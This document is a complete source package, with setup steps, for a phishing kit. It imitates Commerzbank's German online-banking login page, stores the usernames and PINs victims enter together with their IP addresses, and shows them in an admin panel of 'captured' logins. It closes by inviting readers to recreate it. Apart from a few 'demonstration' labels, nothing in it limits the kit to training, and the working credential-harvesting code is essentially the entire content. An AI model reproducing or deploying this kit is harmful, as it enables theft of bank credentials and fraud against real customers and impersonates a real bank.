# Commerzbank Phishing Panel - Complete Source Code

## Setup Instructions

1. Create a new Node.js project: `npm init -y`
2. Install dependencies (see package.json below)
3. Create the folder structure:
   ```
   project/
   ├── client/src/
   │   ├── components/ui/
   │   ├── pages/
   │   ├── lib/
   │   └── hooks/
   ├── server/
   ├── shared/
   └── config files
   ```
4. Copy all the code below into respective files
5. Set up PostgreSQL database and add DATABASE_URL
6. Run: `npm run db:push`
7. Start: `npm run dev`

---

## package.json
```json
{
  "name": "commerzbank-phishing-panel",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "dev": "NODE_ENV=development tsx server/index.ts",
    "build": "npm run build:client && npm run build:server",
    "build:client": "vite build --outDir dist/public",
    "build:server": "esbuild server/index.ts --bundle --platform=node --outfile=dist/index.js --external:@neondatabase/serverless",
    "start": "node dist/index.js",
    "db:push": "drizzle-kit push"
  },
  "dependencies": {
    "@hookform/resolvers": "^3.3.4",
    "@neondatabase/serverless": "^0.9.0",
    "@radix-ui/react-accordion": "^1.1.2",
    "@radix-ui/react-alert-dialog": "^1.0.5",
    "@radix-ui/react-aspect-ratio": "^1.0.3",
    "@radix-ui/react-avatar": "^1.0.4",
    "@radix-ui/react-checkbox": "^1.0.4",
    "@radix-ui/react-collapsible": "^1.0.3",
    "@radix-ui/react-context-menu": "^2.1.5",
    "@radix-ui/react-dialog": "^1.0.5",
    "@radix-ui/react-dropdown-menu": "^2.0.6",
    "@radix-ui/react-hover-card": "^1.0.7",
    "@radix-ui/react-label": "^2.0.2",
    "@radix-ui/react-menubar": "^1.0.4",
    "@radix-ui/react-navigation-menu": "^1.1.4",
    "@radix-ui/react-popover": "^1.0.7",
    "@radix-ui/react-progress": "^1.0.3",
    "@radix-ui/react-radio-group": "^1.1.3",
    "@radix-ui/react-scroll-area": "^1.0.5",
    "@radix-ui/react-select": "^2.0.0",
    "@radix-ui/react-separator": "^1.0.3",
    "@radix-ui/react-slider": "^1.1.2",
    "@radix-ui/react-slot": "^1.0.2",
    "@radix-ui/react-switch": "^1.0.3",
    "@radix-ui/react-tabs": "^1.0.4",
    "@radix-ui/react-toast": "^1.1.5",
    "@radix-ui/react-toggle": "^1.0.3",
    "@radix-ui/react-toggle-group": "^1.0.4",
    "@radix-ui/react-tooltip": "^1.0.7",
    "@tanstack/react-query": "^5.28.6",
    "class-variance-authority": "^0.7.0",
    "clsx": "^2.1.0",
    "cmdk": "^1.0.0",
    "date-fns": "^3.6.0",
    "drizzle-orm": "^0.29.4",
    "drizzle-zod": "^0.5.1",
    "embla-carousel-react": "^8.0.2",
    "express": "^4.19.2",
    "framer-motion": "^11.0.24",
    "input-otp": "^1.2.4",
    "lucide-react": "^0.368.0",
    "next-themes": "^0.3.0",
    "react": "^18.2.0",
    "react-day-picker": "^8.10.0",
    "react-dom": "^18.2.0",
    "react-hook-form": "^7.51.1",
    "react-resizable-panels": "^2.0.16",
    "recharts": "^2.12.4",
    "tailwind-merge": "^2.2.2",
    "tailwindcss-animate": "^1.0.7",
    "vaul": "^0.9.0",
    "wouter": "^3.1.0",
    "ws": "^8.16.0",
    "zod": "^3.22.4"
  },
  "devDependencies": {
    "@types/express": "^4.17.21",
    "@types/node": "^20.11.30",
    "@types/react": "^18.2.73",
    "@types/react-dom": "^18.2.22",
    "@types/ws": "^8.5.10",
    "@vitejs/plugin-react": "^4.2.1",
    "autoprefixer": "^10.4.19",
    "drizzle-kit": "^0.20.14",
    "esbuild": "^0.20.2",
    "postcss": "^8.4.38",
    "tailwindcss": "^3.4.1",
    "tsx": "^4.7.1",
    "typescript": "^5.4.3",
    "vite": "^5.2.6"
  }
}
```

---

## Database Schema (shared/schema.ts)
```typescript
import { pgTable, text, serial, integer, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const phishingAttempts = pgTable("phishing_attempts", {
  id: serial("id").primaryKey(),
  ipAddress: text("ip_address").notNull(),
  username: text("username").notNull(),
  password: text("password").notNull(),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const sessionStats = pgTable("session_stats", {
  id: serial("id").primaryKey(),
  totalAttempts: integer("total_attempts").default(0).notNull(),
  scenarioCounts: text("scenario_counts").notNull(),
  lastReset: timestamp("last_reset").defaultNow().notNull(),
});

export const insertPhishingAttemptSchema = createInsertSchema(phishingAttempts).omit({
  id: true,
  timestamp: true,
});

export const insertSessionStatsSchema = createInsertSchema(sessionStats).omit({
  id: true,
  lastReset: true,
});

export type InsertPhishingAttempt = z.infer<typeof insertPhishingAttemptSchema>;
export type PhishingAttempt = typeof phishingAttempts.$inferSelect;
export type InsertSessionStats = z.infer<typeof insertSessionStatsSchema>;
export type SessionStats = typeof sessionStats.$inferSelect;
```

---

## Server Database Connection (server/db.ts)
```typescript
import { Pool, neonConfig } from '@neondatabase/serverless';
import { drizzle } from 'drizzle-orm/neon-serverless';
import ws from "ws";
import * as schema from "../shared/schema.js";

neonConfig.webSocketConstructor = ws;

if (!process.env.DATABASE_URL) {
  throw new Error(
    "DATABASE_URL must be set. Did you forget to provision a database?",
  );
}

export const pool = new Pool({ connectionString: process.env.DATABASE_URL });
export const db = drizzle({ client: pool, schema });
```

---

## Server Storage (server/storage.ts)
```typescript
import { phishingAttempts, sessionStats, type PhishingAttempt, type InsertPhishingAttempt, type SessionStats, type InsertSessionStats } from "../shared/schema.js";
import { db } from "./db.js";
import { eq } from "drizzle-orm";

export interface IStorage {
  createPhishingAttempt(attempt: InsertPhishingAttempt): Promise<PhishingAttempt>;
  getAllPhishingAttempts(): Promise<PhishingAttempt[]>;
  clearPhishingAttempts(): Promise<void>;
  getSessionStats(): Promise<SessionStats | undefined>;
  updateSessionStats(stats: Partial<InsertSessionStats>): Promise<SessionStats>;
  resetSessionStats(): Promise<SessionStats>;
}

export class DatabaseStorage implements IStorage {
  async createPhishingAttempt(insertAttempt: InsertPhishingAttempt): Promise<PhishingAttempt> {
    const [attempt] = await db
      .insert(phishingAttempts)
      .values(insertAttempt)
      .returning();
    
    const [currentStats] = await db.select().from(sessionStats).limit(1);
    
    if (currentStats) {
      const scenarioCounts = JSON.parse(currentStats.scenarioCounts);
      scenarioCounts.commerzbank = (scenarioCounts.commerzbank || 0) + 1;
      
      await db
        .update(sessionStats)
        .set({
          totalAttempts: currentStats.totalAttempts + 1,
          scenarioCounts: JSON.stringify(scenarioCounts),
        })
        .where(eq(sessionStats.id, currentStats.id));
    } else {
      await db.insert(sessionStats).values({
        totalAttempts: 1,
        scenarioCounts: JSON.stringify({ commerzbank: 1 }),
      });
    }
    
    return attempt;
  }

  async getAllPhishingAttempts(): Promise<PhishingAttempt[]> {
    return await db.select().from(phishingAttempts).orderBy(phishingAttempts.timestamp);
  }

  async clearPhishingAttempts(): Promise<void> {
    await db.delete(phishingAttempts);
  }

  async getSessionStats(): Promise<SessionStats | undefined> {
    const [stats] = await db.select().from(sessionStats).limit(1);
    return stats || undefined;
  }

  async updateSessionStats(stats: Partial<InsertSessionStats>): Promise<SessionStats> {
    const [currentStats] = await db.select().from(sessionStats).limit(1);
    
    if (currentStats) {
      const [updated] = await db
        .update(sessionStats)
        .set(stats)
        .where(eq(sessionStats.id, currentStats.id))
        .returning();
      return updated;
    } else {
      const [created] = await db
        .insert(sessionStats)
        .values({
          totalAttempts: 0,
          scenarioCounts: JSON.stringify({ commerzbank: 0 }),
          ...stats,
        })
        .returning();
      return created;
    }
  }

  async resetSessionStats(): Promise<SessionStats> {
    await this.clearPhishingAttempts();
    
    const [currentStats] = await db.select().from(sessionStats).limit(1);
    
    if (currentStats) {
      const [updated] = await db
        .update(sessionStats)
        .set({
          totalAttempts: 0,
          scenarioCounts: JSON.stringify({ commerzbank: 0 }),
          lastReset: new Date(),
        })
        .where(eq(sessionStats.id, currentStats.id))
        .returning();
      return updated;
    } else {
      const [created] = await db
        .insert(sessionStats)
        .values({
          totalAttempts: 0,
          scenarioCounts: JSON.stringify({ commerzbank: 0 }),
        })
        .returning();
      return created;
    }
  }
}

export const storage = new DatabaseStorage();
```

---

## Server Routes (server/routes.ts)
```typescript
import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage.js";
import { insertPhishingAttemptSchema } from "../shared/schema.js";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  app.get("/api/stats", async (req, res) => {
    try {
      const stats = await storage.getSessionStats();
      res.json(stats);
    } catch (error) {
      res.status(500).json({ message: "Failed to get session stats" });
    }
  });

  app.post("/api/phishing-attempts", async (req, res) => {
    try {
      const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
      
      const dataWithIp = {
        ...req.body,
        ipAddress: Array.isArray(ipAddress) ? ipAddress[0] : ipAddress,
        userAgent: req.headers['user-agent']
      };
      
      const validatedData = insertPhishingAttemptSchema.parse(dataWithIp);
      const attempt = await storage.createPhishingAttempt(validatedData);
      res.json(attempt);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid data", errors: error.errors });
      } else {
        res.status(500).json({ message: "Failed to create phishing attempt" });
      }
    }
  });

  app.get("/api/phishing-attempts", async (req, res) => {
    try {
      const attempts = await storage.getAllPhishingAttempts();
      res.json(attempts);
    } catch (error) {
      res.status(500).json({ message: "Failed to get phishing attempts" });
    }
  });

  app.post("/api/reset", async (req, res) => {
    try {
      const stats = await storage.resetSessionStats();
      res.json({ message: "Demonstration reset successfully", stats });
    } catch (error) {
      res.status(500).json({ message: "Failed to reset demonstration" });
    }
  });

  app.delete("/api/phishing-attempts", async (req, res) => {
    try {
      await storage.clearPhishingAttempts();
      res.json({ message: "Captured data cleared successfully" });
    } catch (error) {
      res.status(500).json({ message: "Failed to clear captured data" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
```

---

## Main Server (server/index.ts)
```typescript
import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes.js";
import { setupVite, serveStatic, log } from "./vite.js";

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }

      log(logLine);
    }
  });

  next();
});

(async () => {
  const server = await registerRoutes(app);

  app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    res.status(status).json({ message });
    throw err;
  });

  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  const PORT = 5000;
  server.listen(PORT, "0.0.0.0", () => {
    log(`serving on port ${PORT}`);
  });
})();
```

---

## Client Main App (client/src/App.tsx)
```typescript
import { Switch, Route } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "./components/ui/toaster";
import { TooltipProvider } from "./components/ui/tooltip";
import AdminPanel from "./pages/admin-panel";
import PhishingSite from "./pages/phishing-site";

function Router() {
  return (
    <Switch>
      <Route path="/" component={AdminPanel} />
      <Route path="/admin" component={AdminPanel} />
      <Route path="/login" component={PhishingSite} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
```

---

## Query Client (client/src/lib/queryClient.ts)
```typescript
import { QueryClient } from "@tanstack/react-query";

async function throwIfResNotOk(res: Response) {
  if (!res.ok) {
    const body = await res.text();
    throw new Error(`Request failed: ${res.status} ${res.statusText}. ${body}`);
  }
}

export async function apiRequest(
  method: "GET" | "POST" | "PUT" | "DELETE" | "PATCH",
  url: string,
  body?: any,
): Promise<Response> {
  const requestInit: RequestInit = {
    method,
    headers: {},
    credentials: "include",
  };

  if (body) {
    requestInit.headers = {
      ...requestInit.headers,
      "Content-Type": "application/json",
    };
    requestInit.body = JSON.stringify(body);
  }

  const res = await fetch(url, requestInit);
  await throwIfResNotOk(res);
  return res;
}

type UnauthorizedBehavior = "returnNull" | "throw";
export const getQueryFn: <T>(options: {
  on401: UnauthorizedBehavior;
}) => (context: { queryKey: readonly unknown[] }) => Promise<T> =
  ({ on401 }) =>
  async ({ queryKey }) => {
    const [url, ...params] = queryKey as [string, ...unknown[]];
    try {
      const res = await apiRequest("GET", url);
      return await res.json();
    } catch (err: any) {
      if (err.message?.includes("401") && on401 === "returnNull") {
        return null;
      }
      throw err;
    }
  };

export const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      queryFn: getQueryFn({ on401: "throw" }),
      staleTime: 1000 * 60 * 5,
      refetchOnWindowFocus: false,
    },
  },
});
```

---

## Admin Panel (client/src/pages/admin-panel.tsx)
```typescript
import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "../components/ui/card";
import { Button } from "../components/ui/button";
import { Badge } from "../components/ui/badge";
import { Trash2, RefreshCw, Download } from "lucide-react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { apiRequest } from "../lib/queryClient";
import { useToast } from "../hooks/use-toast";

export default function AdminPanel() {
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const { data: attempts = [], isLoading } = useQuery({
    queryKey: ["/api/phishing-attempts"],
    refetchInterval: 2000,
  });

  const { data: stats = {} } = useQuery({
    queryKey: ["/api/stats"],
    refetchInterval: 2000,
  });

  const clearDataMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("DELETE", "/api/phishing-attempts");
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/phishing-attempts"] });
      queryClient.invalidateQueries({ queryKey: ["/api/stats"] });
      toast({
        title: "Data Cleared",
        description: "All captured data has been removed.",
      });
    },
  });

  const resetMutation = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/reset");
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/stats"] });
      queryClient.invalidateQueries({ queryKey: ["/api/phishing-attempts"] });
      toast({
        title: "System Reset",
        description: "All data cleared and counters reset.",
      });
    },
  });

  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-gray-900">Admin Panel</h1>
              <p className="text-gray-600 mt-1">Commerzbank Security Monitoring</p>
            </div>
            <div className="flex space-x-3">
              <Button
                onClick={() => resetMutation.mutate()}
                disabled={resetMutation.isPending}
                className="bg-red-600 hover:bg-red-700 text-white"
              >
                <RefreshCw className="h-4 w-4 mr-2" />
                Reset System
              </Button>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">Total Captures</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-gray-900">{(stats as any)?.totalAttempts || 0}</div>
            </CardContent>
          </Card>
          
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">Active Sessions</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-green-600">Live</div>
            </CardContent>
          </Card>
          
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">Last Reset</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-sm text-gray-600">
                {(stats as any)?.lastReset ? new Date((stats as any).lastReset).toLocaleString() : 'Never'}
              </div>
            </CardContent>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center">
              <span className="mr-2">🎯</span>
              Captured Login Attempts
              <Badge className="ml-3 bg-red-100 text-red-700">
                {Array.isArray(attempts) ? attempts.length : 0} entries
              </Badge>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="text-center py-8 text-gray-500">Loading captured data...</div>
            ) : !Array.isArray(attempts) || attempts.length === 0 ? (
              <div className="text-center py-8 text-gray-500">
                No login attempts captured yet
                <br />
                <span className="text-sm">Data will appear here when users submit the form</span>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b">
                      <th className="text-left py-3 px-4 font-medium text-gray-600">Timestamp</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">IP Address</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">Username</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">Password</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">User Agent</th>
                    </tr>
                  </thead>
                  <tbody>
                    {Array.isArray(attempts) && attempts.map((attempt: any) => (
                      <tr key={attempt.id} className="border-b hover:bg-gray-50">
                        <td className="py-3 px-4 text-sm text-gray-900">
                          {new Date(attempt.timestamp).toLocaleString()}
                        </td>
                        <td className="py-3 px-4">
                          <Badge variant="outline" className="font-mono text-xs">
                            {attempt.ipAddress}
                          </Badge>
                        </td>
                        <td className="py-3 px-4 font-mono text-sm text-blue-700">
                          {attempt.username}
                        </td>
                        <td className="py-3 px-4 font-mono text-sm text-red-700">
                          {'•'.repeat(attempt.password.length)}
                        </td>
                        <td className="py-3 px-4 text-xs text-gray-500 max-w-xs truncate">
                          {attempt.userAgent || 'Unknown'}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
```

---

## Phishing Site (client/src/pages/phishing-site.tsx)
```typescript
import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import { Label } from "../components/ui/label";
import { Card, CardContent } from "../components/ui/card";
import { apiRequest } from "../lib/queryClient";
import { useToast } from "../hooks/use-toast";

export default function PhishingSite() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const { toast } = useToast();

  const submitMutation = useMutation({
    mutationFn: async (data: { username: string; password: string }) => {
      const response = await apiRequest("POST", "/api/phishing-attempts", data);
      return response.json();
    },
    onSuccess: () => {
      setShowSuccess(true);
      setTimeout(() => {
        setShowSuccess(false);
        setUsername("");
        setPassword("");
      }, 3000);
    },
    onError: () => {
      toast({
        title: "Fehler",
        description: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
        variant: "destructive",
      });
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;
    
    submitMutation.mutate({ username, password });
  };

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <Card className="w-full max-w-md">
          <CardContent className="p-8 text-center">
            <div className="text-green-600 text-6xl mb-4">✓</div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Anmeldung erfolgreich</h2>
            <p className="text-gray-600">Sie werden automatisch weitergeleitet...</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4 py-3">
          <div className="flex items-center space-x-4">
            <div className="w-8 h-8 bg-yellow-400 rounded-sm flex items-center justify-center">
              <span className="text-black font-bold text-sm">C</span>
            </div>
            <span className="text-xl font-light text-gray-800">Commerzbank</span>
            <div className="flex-1"></div>
            <div className="text-sm text-gray-600">Sicher | Privat | Vertrauenswürdig</div>
          </div>
        </div>
      </div>

      <div className="flex items-center justify-center min-h-[calc(100vh-80px)] p-4">
        <div className="w-full max-w-md">
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-start space-x-3">
              <div className="text-blue-600 text-lg">🔒</div>
              <div>
                <h3 className="font-medium text-blue-900">Sicherheitshinweis</h3>
                <p className="text-sm text-blue-800 mt-1">
                  Ihre Verbindung ist verschlüsselt und sicher. Geben Sie Ihre Zugangsdaten ein, um fortzufahren.
                </p>
              </div>
            </div>
          </div>

          <Card className="border-0 shadow-lg">
            <CardContent className="p-8">
              <div className="text-center mb-6">
                <h1 className="text-2xl font-light text-gray-900 mb-2">Online-Banking</h1>
                <p className="text-gray-600 text-sm">Melden Sie sich mit Ihren Zugangsdaten an</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                  <Label htmlFor="username" className="block text-sm font-medium text-gray-700 mb-2">
                    Benutzername / Kontonummer
                  </Label>
                  <Input
                    id="username"
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
                    placeholder="Benutzername eingeben"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                    PIN / Passwort
                  </Label>
                  <Input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
                    placeholder="PIN eingeben"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  disabled={submitMutation.isPending || !username || !password}
                  className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-medium py-2 px-4 rounded-md transition-colors"
                >
                  {submitMutation.isPending ? "Wird überprüft..." : "Anmelden"}
                </Button>
              </form>

              <div className="mt-6 text-center space-y-3">
                <div className="flex items-center justify-center space-x-4 text-sm text-gray-500">
                  <span>Passwort vergessen?</span>
                  <span>•</span>
                  <span>Hilfe</span>
                </div>
                
                <div className="flex items-center justify-center space-x-2 text-xs text-gray-400">
                  <span>🔒</span>
                  <span>SSL-verschlüsselt</span>
                  <span>•</span>
                  <span>TLS 1.3</span>
                  <span>•</span>
                  <span>256-bit Verschlüsselung</span>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="mt-8 text-center text-xs text-gray-500">
            <p>© 2024 Commerzbank AG. Alle Rechte vorbehalten.</p>
            <p className="mt-1">Für Ihre Sicherheit: Geben Sie Ihre Daten niemals an Dritte weiter.</p>
          </div>
        </div>
      </div>
    </div>
  );
}
```

---

## Configuration Files

### drizzle.config.ts
```typescript
import { config } from "dotenv";
import { defineConfig } from "drizzle-kit";

config({ path: ".env" });

export default defineConfig({
  schema: "./shared/schema.ts",
  out: "./migrations",
  dialect: "postgresql",
  dbCredentials: {
    url: process.env.DATABASE_URL!,
  },
});
```

### vite.config.ts
```typescript
import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";
import path from "path";

export default defineConfig({
  plugins: [react()],
  resolve: {
    alias: {
      "@": path.resolve(__dirname, "./client/src"),
      "@shared": path.resolve(__dirname, "./shared"),
    },
  },
  root: path.resolve(__dirname, "client"),
  build: {
    outDir: path.resolve(__dirname, "dist/public"),
    emptyOutDir: true,
  },
});
```

### tailwind.config.ts
```typescript
import type { Config } from "tailwindcss";

const config = {
  darkMode: ["class"],
  content: [
    "./client/src/**/*.{ts,tsx}",
  ],
  prefix: "",
  theme: {
    container: {
      center: true,
      padding: "2rem",
      screens: {
        "2xl": "1400px",
      },
    },
    extend: {
      colors: {
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
      },
      borderRadius: {
        lg: "var(--radius)",
        md: "calc(var(--radius) - 2px)",
        sm: "calc(var(--radius) - 4px)",
      },
      keyframes: {
        "accordion-down": {
          from: { height: "0" },
          to: { height: "var(--radix-accordion-content-height)" },
        },
        "accordion-up": {
          from: { height: "var(--radix-accordion-content-height)" },
          to: { height: "0" },
        },
      },
      animation: {
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
      },
    },
  },
  plugins: [require("tailwindcss-animate")],
} satisfies Config;

export default config;
```

This document contains all the essential code you need to recreate the Commerzbank phishing panel. Copy each section into the appropriate files and follow the setup instructions at the top.